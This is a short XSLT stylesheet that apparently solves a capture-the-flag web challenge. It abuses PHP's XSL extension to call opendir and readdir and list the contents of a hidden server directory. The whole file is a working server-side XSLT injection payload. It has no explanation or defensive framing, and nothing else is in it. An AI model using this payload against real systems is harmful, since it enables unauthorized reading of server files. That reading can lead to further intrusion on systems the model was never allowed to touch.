<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/')"/>
[1] <xsl:value-of select="php:function('readdir')"/>
[2] <xsl:value-of select="php:function('readdir')"/>
[3] <xsl:value-of select="php:function('readdir')"/>
[4] <xsl:value-of select="php:function('readdir')"/>
[5] <xsl:value-of select="php:function('readdir')"/>
</xsl:template>
</xsl:stylesheet>
